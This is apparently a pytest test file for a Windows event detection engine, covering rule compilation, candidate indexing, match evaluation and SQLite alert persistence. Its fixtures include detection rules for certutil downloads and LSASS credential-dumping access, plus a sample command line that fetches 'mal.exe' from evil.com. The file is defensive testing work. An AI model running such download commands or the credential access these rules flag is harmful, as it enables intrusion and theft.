"""Unit tests for DetectionEngine, CompiledRule, fast candidate indexing, and SQLite alert persistence."""

from __future__ import annotations

from datetime import datetime, timezone

import pytest

from pathlib import Path

from app.config import DatabaseSettings
from app.database.connection import DatabaseManager
from app.database.migrations import MigrationRunner
from app.database.repository import AlertRepository, EventRepository
from app.detection.engine import CompiledRule, DetectionEngine
from app.models.events import EventCategory, NormalizedEvent
from app.models.rule import DetectionBlock, DetectionRule, LogSource, RuleSeverity, RuleStatus


@pytest.fixture
def db_manager(tmp_path: Path) -> DatabaseManager:
    """Fixture providing an initialized SQLite database with migrations applied."""
    db_file = tmp_path / "winsentinel_test.db"
    settings = DatabaseSettings(db_path=str(db_file), wal_mode=False)
    manager = DatabaseManager(db_path=db_file, settings=settings)
    runner = MigrationRunner(manager)
    runner.apply_migrations()
    return manager


@pytest.fixture
def certutil_rule() -> DetectionRule:
    """Fixture providing a sample Certutil execution rule."""
    return DetectionRule(
        id="WS-SYS-001",
        title="Suspicious Certutil Download",
        description="Detects suspicious use of certutil to download files via urlcache.",
        severity=RuleSeverity.HIGH,
        status=RuleStatus.ACTIVE,
        logsource=LogSource(
            category="process_creation",
            product="windows",
            service="sysmon",
            event_id=1,
        ),
        detection=DetectionBlock(
            condition="selection and not filter_benign",
            selection={
                "Image|endswith": r"\certutil.exe",
                "CommandLine|contains": ["-urlcache", "-split"],
            },
            filter_benign={
                "CommandLine|contains": "-verify",
            },
        ),
        mitre_attack=["T1105"],
        investigation_steps=["Check parent process lineage", "Analyze network telemetry"],
    )


@pytest.fixture
def lsass_rule() -> DetectionRule:
    """Fixture providing a sample LSASS access rule."""
    return DetectionRule(
        id="WS-SYS-010",
        title="Suspicious LSASS GrantedAccess",
        description="Detects suspicious access rights to lsass.exe indicating credential dumping.",
        severity=RuleSeverity.CRITICAL,
        status=RuleStatus.ACTIVE,
        logsource=LogSource(
            category="process_access",
            product="windows",
            service="sysmon",
            event_id=10,
        ),
        detection=DetectionBlock(
            condition="selection",
            selection={
                "TargetImage|endswith": r"\lsass.exe",
                "GrantedAccess|contains": ["0x1010", "0x1410"],
            },
        ),
        mitre_attack=["T1003.001"],
    )


@pytest.fixture
def universal_rule() -> DetectionRule:
    """Fixture providing a universal rule without specific event_id."""
    return DetectionRule(
        id="WS-GEN-001",
        title="Suspicious Temp Execution",
        description="Detects execution from temp directory across any log source.",
        severity=RuleSeverity.MEDIUM,
        status=RuleStatus.ACTIVE,
        logsource=LogSource(
            product="windows",
            service=None,
            event_id=None,
        ),
        detection=DetectionBlock(
            condition="selection",
            selection={
                "Image|contains": "\\AppData\\Local\\Temp\\",
            },
        ),
    )


@pytest.fixture
def sample_certutil_event() -> NormalizedEvent:
    """Fixture providing a NormalizedEvent matching the certutil rule."""
    return NormalizedEvent(
        event_id=1,
        record_id=200,
        provider="Microsoft-Windows-Sysmon",
        channel="Microsoft-Windows-Sysmon/Operational",
        computer="ENDPOINT-01.corp.local",
        timestamp=datetime(2023, 4, 10, 15, 30, 0, tzinfo=timezone.utc),
        event_category=EventCategory.PROCESS,
        event_type="ProcessCreate",
        process_guid="{11111111-2222-3333-4444-555555555555}",
        process_id=4560,
        image=r"C:\Windows\System32\certutil.exe",
        command_line="certutil.exe -urlcache -split http://evil.com/mal.exe",
        user=r"CORP\victim",
        parent_image=r"C:\Windows\System32\cmd.exe",
        raw_payload="<Event>1</Event>",
        event_hash="hash_certutil_001",
    )


def test_compiled_rule_structure(certutil_rule: DetectionRule) -> None:
    """Test 1: Verify CompiledRule pre-parses AST and extracts selections."""
    engine = DetectionEngine()
    compiled = engine.register_rule(certutil_rule)

    assert isinstance(compiled, CompiledRule)
    assert compiled.rule.id == "WS-SYS-001"
    assert "selection" in compiled.selections
    assert "filter_benign" in compiled.selections
    assert compiled.ast_root is not None


def test_detection_engine_indexing_and_candidate_routing(
    certutil_rule: DetectionRule,
    lsass_rule: DetectionRule,
    universal_rule: DetectionRule,
) -> None:
    """Test 2 & 3: Verify (provider, event_id) fast indexing and universal rules."""
    engine = DetectionEngine()
    engine.load_rules([certutil_rule, lsass_rule, universal_rule])

    # Check indexed buckets
    assert len(engine._index[("sysmon", 1)]) == 1
    assert len(engine._index[("sysmon", 10)]) == 1
    assert len(engine._universal_rules) == 1
    assert engine._universal_rules[0].rule.id == "WS-GEN-001"


def test_evaluate_event_positive_match(
    certutil_rule: DetectionRule,
    sample_certutil_event: NormalizedEvent,
) -> None:
    """Test 4 & 5: Verify candidate dispatch, AST evaluation, and DetectionMatch creation."""
    engine = DetectionEngine()
    engine.register_rule(certutil_rule)

    matches = engine.evaluate_event(sample_certutil_event, event_db_id=12)
    assert len(matches) == 1

    match = matches[0]
    assert match.rule_id == "WS-SYS-001"
    assert match.rule_title == "Suspicious Certutil Download"
    assert match.severity == "high"
    assert match.event_id == 1
    assert match.event_db_id == 12
    assert match.computer == "ENDPOINT-01.corp.local"
    assert match.image == r"C:\Windows\System32\certutil.exe"
    assert match.command_line == "certutil.exe -urlcache -split http://evil.com/mal.exe"
    assert len(match.matched_evidence) >= 2
    assert "WS-SYS-001" in match.explanation
    assert match.mitre_techniques == ["T1105"]


def test_evaluate_event_exclusion_filter_blocks_match(
    certutil_rule: DetectionRule,
) -> None:
    """Test 6: Verify exclusion filter suppresses match when condition evaluates to False."""
    engine = DetectionEngine()
    engine.register_rule(certutil_rule)

    # Event matching selection but also matching filter_benign (-verify)
    benign_event = NormalizedEvent(
        event_id=1,
        record_id=201,
        provider="Microsoft-Windows-Sysmon",
        channel="Microsoft-Windows-Sysmon/Operational",
        computer="ENDPOINT-01.corp.local",
        timestamp=datetime.now(timezone.utc),
        event_category=EventCategory.PROCESS,
        event_type="ProcessCreate",
        image=r"C:\Windows\System32\certutil.exe",
        command_line="certutil.exe -urlcache -verify cert.cer",
        raw_payload="<Event>benign</Event>",
        event_hash="hash_benign_001",
    )

    matches = engine.evaluate_event(benign_event)
    assert matches == []


def test_evaluate_event_unrelated_event_id_bypasses_rule(
    certutil_rule: DetectionRule,
) -> None:
    """Test 4: Verify event with non-matching event_id skips unrelated rules."""
    engine = DetectionEngine()
    engine.register_rule(certutil_rule)

    # Network connection event (EID 3) should not trigger EID 1 certutil rule
    network_event = NormalizedEvent(
        event_id=3,
        record_id=202,
        provider="Microsoft-Windows-Sysmon",
        channel="Microsoft-Windows-Sysmon/Operational",
        computer="ENDPOINT-01.corp.local",
        timestamp=datetime.now(timezone.utc),
        event_category=EventCategory.NETWORK,
        event_type="NetworkConnect",
        image=r"C:\Windows\System32\certutil.exe",
        destination_ip="1.2.3.4",
        raw_payload="<Event>net</Event>",
        event_hash="hash_net_001",
    )

    matches = engine.evaluate_event(network_event)
    assert matches == []


def test_evaluate_batch_aggregation(
    certutil_rule: DetectionRule,
    sample_certutil_event: NormalizedEvent,
) -> None:
    """Test 7: Verify evaluate_batch evaluates events in order and aggregates matches."""
    engine = DetectionEngine()
    engine.register_rule(certutil_rule)

    non_matching = NormalizedEvent(
        event_id=1,
        record_id=203,
        provider="Microsoft-Windows-Sysmon",
        channel="Microsoft-Windows-Sysmon/Operational",
        computer="ENDPOINT-01.corp.local",
        timestamp=datetime.now(timezone.utc),
        event_category=EventCategory.PROCESS,
        event_type="ProcessCreate",
        image=r"C:\Windows\System32\notepad.exe",
        command_line="notepad.exe file.txt",
        raw_payload="<Event>notepad</Event>",
        event_hash="hash_notepad_001",
    )

    batch = [non_matching, sample_certutil_event, non_matching]
    matches = engine.evaluate_batch(batch)

    assert len(matches) == 1
    assert matches[0].rule_id == "WS-SYS-001"


def test_persist_matches_sqlite_bridge(
    db_manager: DatabaseManager,
    certutil_rule: DetectionRule,
    sample_certutil_event: NormalizedEvent,
) -> None:
    """Test 8: Verify persist_matches creates alerts and links alert_evidence in SQLite."""
    # First insert the event into events table so foreign key constraint is satisfied
    event_repo = EventRepository(db_manager)
    event_repo.insert_events_batch([sample_certutil_event])

    stored_event = event_repo.get_event_by_hash("hash_certutil_001")
    assert stored_event is not None
    # Look up the generated event row ID
    with db_manager.get_connection() as conn:
        row = conn.execute("SELECT id FROM events WHERE event_hash = 'hash_certutil_001';").fetchone()
        event_db_id = int(row["id"])

    # Register rule and evaluate event with event_db_id
    engine = DetectionEngine()
    engine.register_rule(certutil_rule)
    matches = engine.evaluate_event(sample_certutil_event, event_db_id=event_db_id)
    assert len(matches) == 1

    # Persist matches using DatabaseManager
    alert_ids = engine.persist_matches(db_manager, matches)
    assert len(alert_ids) == 1
    alert_id = alert_ids[0]

    # Verify alert record in database
    alert_repo = AlertRepository(db_manager)
    alert = alert_repo.get_alert(alert_id)
    assert alert is not None
    assert alert["rule_id"] == "WS-SYS-001"
    assert alert["title"] == "Suspicious Certutil Download"
    assert alert["severity"] == "high"
    assert alert["computer"] == "ENDPOINT-01.corp.local"
    assert len(alert["evidence"]) >= 1

    linked_ev = alert["evidence"][0]
    assert linked_ev["alert_id"] == alert_id
    assert linked_ev["event_id"] == event_db_id
    assert "CommandLine" in linked_ev["matched_field"] or "command_line" in linked_ev["matched_field"]
    assert "WS-SYS-001" in linked_ev["explanation"]

    # Also test persisting using AlertRepository directly
    alert_ids_2 = engine.persist_matches(matches, alert_repo)
    assert len(alert_ids_2) == 1
